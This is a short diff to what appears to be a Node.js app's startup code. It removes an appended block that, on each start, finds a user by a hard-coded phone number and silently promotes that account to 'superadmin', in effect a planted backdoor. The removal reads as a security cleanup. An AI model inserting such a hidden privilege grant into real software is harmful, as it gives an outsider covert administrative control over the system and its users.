@@ -350,13 +350,3 @@ const startApp = async () => {
 
 // init
 startApp();
-
-
-
-User.findOne({$or: [
-    { 'phone': '+79651000086' },
-    { 'login': '+79651000086' }
-  ]}).then(e => {
-  e.role = 'superadmin'
-  e.save()
-})
